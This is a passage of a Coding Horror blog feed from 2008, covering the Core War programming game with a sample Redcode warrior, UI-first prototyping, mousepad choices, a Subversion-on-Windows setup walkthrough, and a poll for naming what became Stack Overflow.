Core War, surprisingly, is still around. The current hub appears to be at <a href="http://corewar.co.uk/">corewar.co.uk</a>. You can download simulators for a variety of operating systems there. Here's how a Core War battle works:
</p>
<p>
</p>
<blockquote>
Core War has four main components: a memory array of 8,000 addresses, the assembly language Redcode, an executive program called MARS (an acronym for Memory Array Redcode Simulator) and the set of contending battle programs. Two battle programs are entered into the memory array at randomly chosen positions; neither program knows where the other one is. MARS executes the programs in a simple version of time-sharing, a technique for allocation the resources of a computer among numerous users. The two programs take turns: a single instruction of the first program is executed, then a single instruction of the second, and so on.
<p>
What a battle program does during the execution cycles allotted to it is entirely up to the programmer. The aim, of course, is to destroy the other program by ruining its instructions. A defensive strategy is also possible: a program might undertake to repair any damage it has received or to move out of the way when it comes under attack. The battle ends when MARS comes to an instruction in one of the programs that cannot be executed. The program with the faulty instruction -- which presumably is a casualty of war -- is declared the loser.
</p>
</blockquote>
<p>
Let's see it in action using one of the simulators. What you're watching here is a round-robin tournament between the <b>Imp</b> [yellow], <b>Mice</b> [blue], <b>Midget</b> [white], and <b>Piper</b> [green] programs.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
The winner is <b>Piper</b> [green], with 2 wins, 0 losses, and 1 tie.
</p>
<p>
These programs are written in an assembly-like dialect known as Redcode. Here's the source code for <b>Midget</b>:
</p>
<p>
</p>
<pre>
;redcode
;name Midget
;author Chip Wendell
;strategy stone (bomber)
;history Third place at the 1986 ICWS tournament
Bomb	dat	#0,	#-980
Spacer	equ	28
Start	mov	Bomb,	@Bomb
sub	#Spacer,Bomb
jmp	Start,	#0
end	Start
</pre>
<p>
The <a href="http://vyznev.net/corewar/guide.html#start_instr">Redcode instruction set</a> is deliberately simple. There are two variants, ICWS-88 with 10 instructions and 4 addressing modes, and ICWS-94 with 19 instructions and 8 addressing modes.
</p>
<p>
</p>
<table cellpadding="4" cellspacing="4">
<tr>
<td>
<code>DAT</code>
</td>
<td>
data</td>
<td>
<code>DJN</code>
</td>
<td>
decrement and jump if not zero</td>
</tr>
<tr>
<td>
<code>MOV</code>
</td>
<td>
move / copy</td>
<td>
<code>SPL</code>
</td>
<td>
split</td>
</tr>
<tr>
<td>
<code>ADD</code>
</td>
<td>
add</td>
<td>
<code>CMP</code>
</td>
<td>
compare</td>
</tr>
<tr>
<td>
<code>SUB</code>
</td>
<td>
subtract</td>
<td>
<code>SEQ</code>
</td>
<td>
skip if equal</td>
</tr>
<tr>
<td>
<code>MUL</code>
</td>
<td>
multiply</td>
<td>
<code>SNE</code>
</td>
<td>
skip if not equal</td>
</tr>
<tr>
<td>
<code>DIV</code>
</td>
<td>
divide</td>
<td>
<code>SLT</code>
</td>
<td>
skip if lower than</td>
</tr>
<tr>
<td>
<code>MOD</code>
</td>
<td>
modulus</td>
<td>
<code>LDP</code>
</td>
<td>
load from private space</td>
</tr>
<tr>
<td>
<code>JMP</code>
</td>
<td>
jump</td>
<td>
<code>STP</code>
</td>
<td>
save to private space</td>
</tr>
<tr>
<td>
<code>JMZ</code>
</td>
<td>
jump if zero</td>
<td>
<code>NOP</code>
</td>
<td>
no operation</td>
</tr>
<tr>
<td>
<code>JMN</code>
</td>
<td>
jump if not zero</td>
<td>
 </td>
<td>
 </td>
</tr>
</table>
<p>
It's structured so that there is no "killer app"; three broad strategies are possible, each with its own strengths and weaknesses.
</p>
<p>
</p>
<ol>
<li>
<b>Paper</b> or Replicator
<p>
Try to fill the core with copies of your program, so you are harder to kill.
</p>
<p>
</p>
</li>
<li>
<b>Rock</b> or Bomber
<p>
Attack by writing illegal instructions throughout the core-- but not on your own program's memory.
</p>
<p>
</p>
</li>
<li>
<b>Scissors</b> or Scanner
<p>
Attempt to identify enemy programs lurking in the core, then target writes to eliminate them.
</p>
</li>
</ol>
<p>
Of course, combinations of the above strategies are possible as well. As you might imagine after 25 years of battlefield evolution, some modern Core War programs are quite baroque by now.
</p>
<p>
It's not particularly useful, but it is a programming <i>game</i>, after all. It's also a fascinating bit of computer science history. If you're interested in participating in the venerable sport of Core War, it's still very much alive and kicking. The <a href="http://corewar.atspace.com/top10.html">top 10 links for Core War newbies</a> is a great place to get started.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-04-01T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/core-war-two-programs-enter-one-program-leaves/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ UI-First Software Development ]]></title>
<link>https://blog.codinghorror.com/ui-first-software-development/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
We're currently in the midst of building the new web property I <a href="http://www.codinghorror.com/blog/archives/001074.html">alluded to in a previous post</a>. Before I write a single line of code, I want to have a <b>pretty clear idea of what the user interface will look like first</b>. I'm in <a href="http://blogs.msdn.com/rick_schaut/archive/2004/04/02/106929.aspx">complete agreement with Rick Schaut here</a>:
</p>
<p>
</p>
<blockquote>
When you're working on end-user software, and it doesn't matter if you're working on a web app, adding a feature to an existing application, or working on a plug-in for some other application, <b>you need to design the UI <i>first</i></b>.
<p>
This is hard for a couple of reasons. The first is that most programmers, particularly those who've been trained through University-level computer science courses, learned how to program by first writing code that was intended to be run via the command line. As a consequence, we learned how to implement efficient algorithms for common computer science problems, but we never learned how to design a good UI.
</p>
</blockquote>
<p>
Of course, <a href="http://www.codinghorror.com/blog/archives/000325.html">UI is hard</a>, far harder than coding for developers. It's tempting to skip the tough part and do what comes naturally -- start banging away in a code window with no real thought given to how the user will interact with the features you're building.
</p>
<p>
Remember, to the end user, <a href="http://www.codinghorror.com/blog/archives/000371.html">the interface <i>is</i> the application</a>. Doesn't it make sense to think about that <i>before</i> firing up the compiler?
</p>
<p>
It's certainly true that there are limitations on how the UI can be built based on the technology you're using. Just because some pixels can be arranged a certain way in Photoshop doesn't mean that can magically be turned into a compiling, shippable product in any sane timeframe. To ameliorate that problem, take advantage of <a href="http://www.codinghorror.com/blog/archives/000499.html">visual design patterns</a>. If you're building a GUI application, use a palette of widgets common to your GUI. If you're building a web application, use a palette of HTML, CSS, and DOM elements from all over the web. Let the palette enforce your technology constraints.
</p>
<p>
It shouldn't be difficult to sit down with a few basic tools and slap together a rough mockup of how the user interface will look. However, it is extremely important at this point to <b>stay out of technical development environments when mocking your user interface</b>, or the temptation to turn the model into the product may be too strong for your team to resist. Try to avoid <a href="http://www.codinghorror.com/blog/archives/000256.html">the prototype pitfall</a>.
</p>
<p>
So how do we prototype the UI without relying on our development tools? One way is <a href="http://www.alistapart.com/articles/paperprototyping">simple paper prototyping</a>.
</p>
<p>
<a href="http://www.alistapart.com/articles/paperprototyping"><img alt="image placeholder" >
</p>
<p>
The book <a href="http://www.amazon.com/exec/obidos/ASIN/1558608702/codihorr-20">Paper Prototyping: The Fast and Easy way to Design and Refine User Interfaces</a> is an excellent introduction to paper prototyping. You can interactively browse sections of this book at <a href="http://www.amazon.com/exec/obidos/ASIN/1558608702/codihorr-20">Amazon</a>, through <a href="http://books.google.com/books?hl=en&amp;id=5OhE7dyGtmgC&amp;printsec=frontcover&amp;source=web">Google Books</a>, and <a href="http://www.paperprototyping.com/what.html">the book's own dedicated web site</a>.
</p>
<p>
There's a certain timelessness to paper prototyping that holds a deep appeal, <a href="http://www.useit.com/alertbox/20030414.html">as Jacob Nielsen points out</a>:
</p>
<p>
</p>
<blockquote>
Paper prototyping has a second benefit, besides its impact on your current design project's quality. It will also benefit your career. Consider all the other books you've read about computers, Web design, and similar topics. How much of what you learned will still be useful in ten years? In twenty years? In the immortal words of my old boss, Scott McNealy, <b>technology has the shelf life of a banana.</b>
<p>
In contrast, the paper prototyping technique has a shelf life closer to that of, say, paper. Once you've learned paper prototyping, you can use it in every project you do for the rest of your career. I have no idea what user interface technologies will be popular in twenty years, but I do know that I'll have to subject those designs to usability evaluation, and that paper prototyping will be a valuable technique for running early studies.
</p>
</blockquote>
<p>
Paper prototypes are usually pitched in terms of doing <a href="http://www.codinghorror.com/blog/archives/000779.html">low-fi usability studies</a>, and rightly so. But I find a paper prototype tremendously helpful even if I'm the only one that ever sees it. I need to create an image in my mind of what I'm building, as it will be seen by the world, before I start pouring the concrete to make it real.
</p>
<p>
If you need any more convincing that paper prototyping is an incredibly valuable tool-- even for mere developers-- consider the advice of Jared Spool's company, User Interface Engineering:
</p>
<p>
</p>
<ul>
<li>
<a href="http://www.uie.com/articles/paper_prototyping/">Paper Prototypes: Still Our Favorite</a> (1998)
</li>
<li>
<a href="http://www.uie.com/articles/prototyping_tips/">Five Paper Prototyping Tips</a> (2000)
</li>
<li>
<a href="http://www.uie.com/articles/looking_back_on_paper_prototyping/">Looking Back on 16 Years of Paper Prototyping</a> (2005)
</li>
</ul>
<p>
I also recommend reading through <a href="http://www.snyderconsulting.net/article_paperprototyping.htm#commonConcerns">Common Concerns about Paper Prototyping</a> if you're still on the fence.
</p>
<p>
But what happens when you <b>outgrow paper prototying?</b> Jensen Harris, one of the principal UI designers on the Office 2007 team, first <a href="http://blogs.msdn.com/jensenh/archive/2006/01/06/510069.aspx">introduced me to PowerPoint prototyping</a>:
</p>
<p>
</p>
<blockquote>
We use PowerPoint as kind of a better version of <a href="http://blogs.msdn.com/jensenh/archive/2006/01/06/510069.aspx">[Office 2007] paper prototypes</a>. This technique has several advantages: prototypes can be made to feel somewhat interactive, because the content is electronic it can be modified more easily than paper, and (best of all) the usability participant uses the mouse and is on the computer, so it feels natural to them.
</blockquote>
<p>
Of course, it doesn't have to be PowerPoint. Use whatever tool you like, as long as it's <i>not</i> a development tool. You don't want something too powerful. What you want is mild interactivity while remaining simple and straightforward for quick iterative changes. That's the logical next step up from paper prototyping.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
It's a lot easier to share this digital artifact on a distributed team than it is to share a bunch of physical paper. If you're curious about the nuts and bolts of PowerPoint prototyping, dig in:
</p>
<p>
</p>
<ul>
<li>
<a href="http://www.microsoft.com/expression/events-training/globalevent/player/Default.html?South-Korea_Manuel-Clement_Keynote_Wireframe-Prototyping-Using-PowerPoint-2007=Manuel_Clement=Wireframe-Prototyping_Using_PowerPoint_2007">Wireframe prototyping using PowerPoint 2007</a> (Manuel Clement, 26 minute video)
</li>
<li>
<a href="http://www.jansfreeware.com/articles/misc-prototyping.html">Step-by-Step Guide to PowerPoint Prototyping</a> (Jan Verhoeven)
</li>
<li>
<a href="http://www.istartedsomething.com/20071018/powerpoint-prototype-toolkit-01/">PowerPoint Prototyping Toolkit</a> (Long Zheng)
</li>
</ul>
<p>
The pursuit of UI-First software development is more important than any particular tool. Use paper, use PowerPoint, <a href="http://www.adaptivepath.com/blog/2006/08/28/keynote-as-a-prototyping-tool/">use Keynote</a>, use whatever makes sense to you. As long as you avoid, in the words of Manuel Clement, <i>pouring concrete too early</i>.
</p>
<p>
<b>How does your team practice UI-First software development?</b>
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-04-02T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/ui-first-software-development/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Mousing Surface Theory ]]></title>
<link>https://blog.codinghorror.com/mousing-surface-theory/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><blockquote>
<p>This post, and its comments, were <font color="red">updated in 2015</font> to reflect current choices and opinions.</p>
</blockquote>
<p>Hi there. I want to <a href="https://www.youtube.com/watch?v=pZf4agDIgiQ">talk to you about ducts</a>.*</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/pZf4agDIgiQ" frameborder="0" allowfullscreen></iframe>
<p>Sorry, when I said ducts, I meant <b>mousepads</b>.</p>
<p>As I have a <a href="http://blog.codinghorror.com/my-mouse-fetish/">long-standing</a> <a href="http://blog.codinghorror.com/mouse-dpi-and-usb-polling-rate/">mouse</a> <a href="http://blog.codinghorror.com/mouse-ballistics/">fetish</a>, you might not be surprised to learn that I also fetishize the humble mousepad, as well. It's all perfectly healthy. Really.</p>
<p>Let's start with the obvious: <b>do you even need a mousepad?</b> It's a fair question. Are you using a traditional mouse? Maybe you're using a trackball, trackpad, trackpoint, or something else with the word "track" in it. If so, then thanks for reading this far. Come back for my next post.</p>
<p>For the rest of us using standard computer mice, consider the following questions:</p>
<ol>
<li>Is your mousing surface uneven?
</li>
<li>Does your mousing surface have an inconsistent texture?
</li>
<li>Does your mousing surface interfere with the optical LED or laser sensors in modern mice?
</li>
<li>Are you concerned that your present mousing surface will be damaged or marred from extended mousing?
</li>
<li>Do you struggle to find enough room to move your mouse?
</li>
</ol>
<p>If you answered "yes" to any of these questions, <b>you should probably have a mousepad</b>. The average desktop often does not provide a consistent mousing surface; a well-designed mousepad does. That is its purpose – to stake out a consistent, reliable, and durable mousing surface on your desktop.</p>
<p>Believe me, I'd love to be a minimalist and go without any kind of mousepad, but I always end up needing one. I started wearing a <i>permanent</i> mark in <a href="http://adam.pra.to/jerker/">my beloved Ikea Jerker desk</a> with my mousing here at home, for example. I've also found that extended mousing leaves behind an unpleasant-but-cleanable residue, and I'd rather clean the mousepad than my desk.</p>
<p>Now that we've established the need for a mousing surface, it's time to decide exactly what you want:</p>
<ul>
<li>a wrist rest?
</li>
<li>raised and thick or low-profile and thin?
</li>
<li>smooth or textured?
</li>
<li>metal, glass, cloth, or plastic?
</li>
<li>small, medium, large, or <i>obscenely</i> large in size?
</li>
<li>square, rectangular, circular, or some other shape?
</li>
</ul>
<p>And that's <i>before</i> we get into issues of color and style. If you consider the above questions, you can narrow it down substantially. I do have two general recommendations, however.</p>
<p>I'm a big fan of the <a href="http://www.amazon.com/exec/obidos/ASIN/B0036WTBFY/codihorr-20">Razer Vespula</a>. If you're OK with a relatively large mousepad, this 10.2" x 12.6" model is one of my favorites. It's built on a low-profile hard plastic base to resist bending, with soft rubber feet on all sides, as well as a thin rubber mat you can place underneath so there's no slippage.</p>
<p><a href="http://www.amazon.com/exec/obidos/ASIN/B0036WTBFY/codihorr-20"><img alt="image placeholder" >
<p>It's also reversible: one side is "speed" (smooth), the other "control" (textured). And it bundles an optional wrist rest sized to nestle perfectly against the bottom of the pad.</p>
<p>I bought my <a href="http://www.amazon.com/exec/obidos/ASIN/B0036WTBFY/codihorr-20">Vespula</a> way back in 2011 and it's still going strong. Many years later, I believe <strong>the general idea of a reversible, double sided mousepad with a thin metal or hard plastic core is close to the best of all worlds</strong>. With that in mind, I can also recommend the <a href="http://www.amazon.com/exec/obidos/ASIN/B00BF9MZZI/codihorr-20">Corsair MM600</a> and the <a href="http://www.amazon.com/exec/obidos/ASIN/B00OP4GBP0/codihorr-20">Perixx DX-5000XL</a>. They are all big, though. Imagine an iPad or something a bit larger sitting next to your keyboard.</p>
<p>If you're looking for something more basic, I can also recommend XTrac, specifically <a href="http://pcxmods.com/plastic-surface-mousepads/">their hard surface mousepads</a>. They're very thin, rubber backed, and come in a variety of sizes. At one point I had it literally glued to my desk with removable spray adhesive.</p>
<p><a href="http://www.xtracgear.com/mouse-pads/"><img alt="image placeholder" >
<p>They're all thin, but the <a href="http://pcxmods.com/desktop-skins/">Logic "skin" models</a> are super thin. Extreme thinness can make the XTrac a natural extension of your desk.</p>
<p><a href="http://pcxmods.com/plastic-surface-mousepads/"><img alt="image placeholder" >
<p>I don't recommend the cloth / fabric branch of the XTrac family tree – or any mousing surface, for that matter.</p>
<p>I am not proposing either of the above as the final mousing surface solution, but I have used both extensively. There are plenty of other great choices; I've heard people say very nice things about <a href="http://www.amazon.com/gp/search?ie=UTF8&amp;keywords=WOW!PAD&amp;tag=codihorr-20&amp;index=blended&amp;linkCode=ur2&amp;camp=1789&amp;creative=9325">the unusual circular WOW!PAD</a>, for example.</p>
<p>I could also talk about <a href="http://pcxmods.com/products/xtracgear-mad-wax.html">how I regularly lubricate my mice feet and mousepads</a>, but then I'd worry that people might think I've gone too far with my mouse fetish.</p>
<p><a href="http://pcxmods.com/products/xtracgear-mad-wax.html"><img alt="image placeholder" >
<p>Oops.</p>
<p>It's my hope that after reading this, <b>you'll be able to tell a well-designed, quality mousing surface</b> from those cheap, floppy, disintegrating fabric <i>things</i> that are mousepads in name only.</p>
<p><small>* Do your ducts seem old-fashioned? Out of date? Central Services' new duct designs are now available in hundreds of different colors to suit your individual tastes. Hurry now, while stocks last, to <a href="http://www.imdb.com/title/tt0088846/">your nearest Central Services showroom</a>. Designer colors to suit your demanding tastes.</small></p>
<table> 
<tr><td class="welovecodinghorror"> 
[advertisement] What's your next career move? <a href="http://careers.stackoverflow.com/" rel="nofollow">Stack Overflow Careers</a> has the best job listings from great companies, whether you're looking for opportunities at a startup or Fortune 500. You can search our <a href="http://careers.stackoverflow.com/jobs" rel="nofollow">job listings</a> or <a href="http://careers.stackoverflow.com/cv" rel="nofollow">create a profile</a> and let employers find you.
</td></tr> 
</table> <!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-04-03T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/mousing-surface-theory/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Setting up Subversion on Windows ]]></title>
<link>https://blog.codinghorror.com/setting-up-subversion-on-windows/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
When it comes to readily available, free source control, I don't think you can do better than <a href="http://subversion.tigris.org/">Subversion</a> at the moment. I'm not necessarily <i>advocating</i> Subversion; there are plenty of other great source control systems out there -- but few can match the ubiquity and relative simplicity of Subversion. Beyond that, source control is source control, as long as you're <a href="http://www.codinghorror.com/blog/archives/000660.html">not using Visual SourceSafe</a>. And did I mention that Subversion is ... free?
</p>
<p>
Allow me to illustrate how straightforward it is to <b>get a small Subversion server and client going on Windows</b>. It'll take all of 30 minutes, tops, I promise. And that's assuming you read slowly.
</p>
<p>
The first thing we'll do is <a href="http://subversion.tigris.org/servlets/ProjectDocumentList?folderID=91">download the latest Subversion Windows binary installer</a>. At the time of writing, that's 1.46. I recommend overriding the default install path and going with something shorter:
</p>
<p>
</p>
<pre>
c:svn
</pre>
<p>
Note that the installer adds <code>c:svnbin</code> to your path, so you can launch a command prompt and start working with it immediately. Let's create our first source repository, which is effectively a system path.
</p>
<p>
</p>
<pre>
svnadmin create "c:svnrepository"
</pre>
<p>
Within that newly created folder, uncomment the following lines in the <b>conf/svnserve.conf</b> file by removing the pound character from the start of each line:
</p>
<p>
</p>
<pre>
anon-access = none
auth-access = write
password-db = passwd
</pre>
<p>
Next, add some users to the <b>conf/passwd</b> file. You can uncomment the default harry and sally users to play with, or add your own:
</p>
<p>
</p>
<pre>
harry = harryssecret
sally = sallyssecret
</pre>
<p>
As of Subversion 1.4, you can easily <b>install Subversion as a Windows service</b>, so it's always available. Just issue the following command:
</p>
<p>
</p>
<pre>
sc create svnserver binpath= "c:svnbinsvnserve.exe --service -r c:svnrepository"
displayname= "Subversion" depend= Tcpip start= auto
</pre>
<p>
It's set to auto-start so it will start up automatically when the server is rebooted, but it's not running yet. Let's fix that:
</p>
<p>
</p>
<pre>
net start svnserver
</pre>
<p>
Note that the service is running under the <b>Local System account</b>. Normally, this is OK, but if you plan to <a href="http://mckechney.com/SubversionNotifyForWindows">implement any Subversion hook scripts</a> later, you may want to switch the service identity to an Administrator account with more permissions. This is easy enough to do through the traditional Windows services GUI.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Now let's verify that things are working locally by adding a root-level folder in source control for our new project, aptly named <b>myproject</b>.
</p>
<p>
</p>
<pre>
set SVN_EDITOR=c:windowssystem32notepad.exe
svn mkdir svn://localhost/myproject
</pre>
<p>
It's a little weird when running locally on the server, as Subversion will pop up a copy of Notepad with a place for us to enter commit comments. Every good programmer <i>always</i> comments their source control actions, right?
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Enter whatever comment you like, then save and close Notepad. You'll be prompted for credentials at this point; ignore the prompt for Administrator credentials and press enter. Use the credentials you set up earlier in the <code>conf/passwd</code> file. If everything goes to plan, you should be rewarded with a "committed revision 1" message.
</p>
<p>
</p>
<pre>
svn mkdir svn://localhost/myproject
Authentication realm: &lt;svn://localhost:3690&gt;
Password for 'Administrator': [enter]
Authentication realm: &lt;svn://localhost:3690&gt;
Username: sally
Password for 'sally': ************
Committed revision 1.
</pre>
<p>
Congratulations! You just checked your first change into source control!
</p>
<p>
We specified <code>svn://</code> as the prefix to our source control path, which means we're using the native Subversion protocol. The <b>Subversion protocol operates on TCP port 3690</b>, so be sure to poke an appropriate hole in your server's firewall, otherwise clients won't be able to connect.
</p>
<p>
Now that the server's good to go, let's <b>turn our attention to the client</b>. Most people use <a href="http://tortoisesvn.net">TortoiseSVN</a> to interact with Subversion. <a href="http://tortoisesvn.net/downloads">Download the latest 32-bit or 64-bit Windows client</a> (1.4.8.12137 as of this writing) and install it. The installer will tell you to reboot, but you don't have to.
</p>
<p>
Now create a project folder somewhere on your drive. I used <code>c:myproject</code>. Tortoise isn't a program so much as a shell extension. To interact with it, you right click in Explorer. Once you've created the project folder, right click in it and select "SVN Checkout..."
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Type <code>svn://servername/myproject/</code> for the repository URL and click OK.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Tortoise now associates the <code>c:myproject</code> folder with the <code>svn://servername/myproject</code> path in source control. Anything you do on your local filesystem path (well, most things-- there are <a href="http://www.knowing.net/PermaLink,guid,ee63456a-a44f-4799-b30a-3abf6ba3ccb9.aspx">some edge conditions that can get weird</a>) can be checked back in to source control.
</p>
<p>
There's a standard convention in Subversion to <a href="http://svnbook.red-bean.com/en/1.4/svn.reposadmin.planning.html">start with the "TTB folders" at the root of any project</a>:
</p>
<p>
</p>
<blockquote>
Because Subversion uses regular directory copies for branching and tagging (see <a href="http://svnbook.red-bean.com/en/1.4/svn.branchmerge.html">Chapter 4, Branching and Merging</a>), the Subversion community recommends that you choose a repository location for each project root -- the "top-most" directory which contains data related to that project -- and then create three subdirectories beneath that root: <b>trunk</b>, meaning the directory under which the main project development occurs; <b>branches</b>, which is a directory in which to create various named branches of the main development line; <b>tags</b>, which is a collection of tree snapshots that are created, and perhaps destroyed, but never changed.
</blockquote>
<p>
Of course, <a href="http://www.codinghorror.com/blog/archives/000968.html">none of this means your developers will actually <i>understand</i> branching and merging</a>, but as responsible Subversion users, let's dutifully add the TTB folders to our project. Note that we can batch up as many changes as we want and check them all in atomically as one unit. Once we're done, right click the folder and select "SVN Commit..."
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
In the commit dialog, indicate that yes, we do want to check in these files, and we <i>always</i> enter a checkin comment-- right? right?
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
You'll have to enter your server credentials here, but Tortoise will offer to conveniently cache them for you. Once the commit completes, note that the files show up in the shell with source control icon overlays:
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
And now we're done. Well, almost. There are a few settings in Tortoise you need to pay special attention to. Right click and select "TortoiseSVN, Settings".
</p>
<p>
</p>
<ol>
<li>See that hidden ".svn" folder? These folders are where Subversion puts its hidden metadata schmutz so it can keep track of what you're doing in the local filesystem and resolve those changes with the server. The default naming convention of these folders unfortunately conflicts with some fundamental ASP.NET assumptions. If you're an ASP.NET 1.x developer, you need to switch the hidden folders from <b>".svn" to "_svn" format</b>, which is on the General options page. This hack is <a href="http://blog.dotsmart.net/2008/02/19/moving-on-from-svn_asp_dot_net_hack/">no longer necessary in ASP.NET 2.0 or newer</a>.
<p>
</p>
</li>
<li>I'll never understand why, but by default, Tortoise tries to <b>apply source control overlays across every single folder and drive on your system</b>. This can lead to some <a href="http://monk.thelonio.us/post/A-Tortoise-Tip-and-Hotfix-Help.aspx">odd, frustrating file locking problems</a>. Much better to let Tortoise know that it should <i>only</i> work its shell magic on specific folders. Set this via "Icon Overlays"; look for the exclude and include paths. I set the exclude path to everything, and the include path to only my project folder(s).
<p>
<img alt="image placeholder" >
</p>
</li>
</ol>
<p>
Unfortunately, since Tortoise is a shell extension, setting changes may mean you need to reboot. You can try terminating and restarting explorer.exe, but I've had mixed results with that.
</p>
<p>
And with that, we're done. <b>You've successfully set up a Subversion server and client</b>. A modern client-server source control system inside 30 minutes -- not bad at all. As usual, this is only intended as the gentlest of introductions; I encourage you to check out the <a href="http://svnbook.red-bean.com/">excellent Subversion documentation</a> for more depth.
</p>
<p>
I find Subversion to be an excellent, modern source control system. Any minor deficiencies it has (and there are a few, to be clear) are more than made up by its ubiquity, relative simplicity, and robust community support. In the interests of equal time, however, I should mention that some influential developers -- <a href="http://www.youtube.com/watch?v=4XpnKHJAok8">most notably Linus Torvalds</a> -- <b><i>hate</i> Subversion and view it as an actual evil</b>. There's an emerging class of <a href="http://en.wikipedia.org/wiki/Distributed_revision_control">distributed revision control</a> that could eventually supercede existing all the centralized source control systems like Subversion, Vault, Team System, and Perforce.
</p>
<p>
I'm skeptical. I've met precious few developers that really understood the versioning concepts in the simple centralized source control model. I have only the vaguest of hopes that these developers will be able to wrap their brains around the <i>vastly</i> more complicated and powerful model of distributed source control. It took <a href="http://www.codinghorror.com/blog/archives/000686.html">fifteen years for centralized source control usage</a> to become mainstream, so a little patience is always advisable.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-04-05T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/setting-up-subversion-on-windows/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Help Name Our Website ]]></title>
<link>https://blog.codinghorror.com/help-name-our-website/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
As I <a href="http://www.codinghorror.com/blog/archives/001091.html">work on UI prototypes for the new web venture</a>, I've been brainstorming names for the web site we're building. I've surveyed some of the finest minds in the software developer community (for very small values of "fine"), and we've come to a collective realization: <b>naming a website is hard. Really, <i>really</i> hard.</b>
</p>
<p>
You begin to have a new respect for all the <a href="http://blog.wired.com/monkeybites/2007/10/the-web-20-bs-g.html">crazily</a>-<a href="http://www.lightsphere.com/dev/web20.html">named</a> Web 2.0 startups. And then there are <a href="http://blog.dreamhosters.com/2006/07/26/top-10-worst-domain-names/">the domain names</a> which <a href="http://blog.dreamhosters.com/2007/01/26/20-more-unfortunate-domain-names/">must not be named</a>. Some of them are actually <i>serious</i>. What were the people who named experts-exchange.com thinking? I'm not so sure they were.
</p>
<p>
We've racked our collective brains, and this is the best we could do. We'd like your input to see if we're on the right track. <b>Vote for the name that best embodies what you'd like to see on a software developer community website</b>.
</p>
<p>
(voting is now over; the <a href="http://www.addpoll.com/results?14407">winner</a> was <a href="http://www.stackoverflow.com/">stackoverflow.com</a>)
</p>
<p>
</p>
<table cellpadding="8" cellspacing="0" width="450">
<tr>
<td style="width: 260px;" title="humbledeveloper.com - 8%">humbledeveloper.com</td>
<td align="right">563</td>
<td align="right">8%</td>
<td width="90">
<div style=" width: 16px; height: 15px; background-color: rgb(204, 204, 204);"><img alt="image placeholder" >
</td>
</tr>
<tr>
<td style="width: 260px;" title="fellowhackers.com - 4%">fellowhackers.com</td>
<td align="right">302</td>
<td align="right">4%</td>
<td width="90">
<div style=" width: 8px; height: 15px; background-color: rgb(204, 204, 204);"><img alt="image placeholder" >
</td>
</tr>
<tr>
<td style="width: 260px;" title="gosub10.com or gosubten.com - 5%">gosub10.com or gosubten.com</td>
<td align="right">334</td>
<td align="right">5%</td>
<td width="90">
<div style=" width: 10px; height: 15px; background-color: rgb(204, 204, 204);"><img alt="image placeholder" >
</td>
</tr>
<tr>
<td style="width: 260px;" title="writeoncereadmany.com - 2%">writeoncereadmany.com</td>
<td align="right">157</td>
<td align="right">2%</td>
<td width="90">
<div style=" width: 4px; height: 15px; background-color: rgb(204, 204, 204);"><img alt="image placeholder" >
</td>
</tr>
<tr>
<td style="width: 260px;" title="humbleprogrammers.com - 3%">humbleprogrammers.com</td>
<td align="right">179</td>
<td align="right">3%</td>
<td width="90">
<div style=" width: 6px; height: 15px; background-color: rgb(204, 204, 204);"><img alt="image placeholder" >
</td>
</tr>
<tr>
<td style="width: 260px;" title="privatevoid.com - 14%">privatevoid.com</td>
<td align="right">934</td>
<td align="right">14%</td>
<td width="90">
<div style=" width: 28px; height: 15px; background-color: rgb(204, 204, 204);"><img alt="image placeholder" >
</td>
</tr>
<tr>
<td style="width: 260px;" title="cargocultdevs.com - 2%">cargocultdevs.com</td>
<td align="right">109</td>
<td align="right">2%</td>
<td width="90">
<div style=" width: 4px; height: 15px; background-color: rgb(204, 204, 204);"><img alt="image placeholder" >
</td>
</tr>
<tr>
<td style="width: 260px;" title="dereferenced.com - 11%">dereferenced.com</td>
<td align="right">755</td>
<td align="right">11%</td>
<td width="90">
<div style=" width: 22px; height: 15px; background-color: rgb(204, 204, 204);"><img alt="image placeholder" >
</td>
</tr>
<tr>
<td style="width: 260px;" title="bitoriented.com - 7%">bitoriented.com</td>
<td align="right">492</td>
<td align="right">7%</td>
<td width="90">
<div style=" width: 14px; height: 15px; background-color: rgb(204, 204, 204);"><img alt="image placeholder" >
</td>
</tr>
<tr>
<td style="width: 260px;" title="algorithmical.com - 4%">algorithmical.com</td>
<td align="right">301</td>
<td align="right">4%</td>
<td width="90">
<div style=" width: 8px; height: 15px; background-color: rgb(204, 204, 204);"><img alt="image placeholder" >
</td>
</tr>
<tr>
<td style="width: 260px;" title="corecursion.com - 1%">corecursion.com</td>
<td align="right">96</td>
<td align="right">1%</td>
<td width="90">
<div style=" width: 2px; height: 15px; background-color: rgb(204, 204, 204);"><img alt="image placeholder" >
</td>
</tr>
<tr>
<td style="width: 260px;" title="metaprogramming.com - 5%">metaprogramming.com</td>
<td align="right">373</td>
<td align="right">5%</td>
<td width="90">
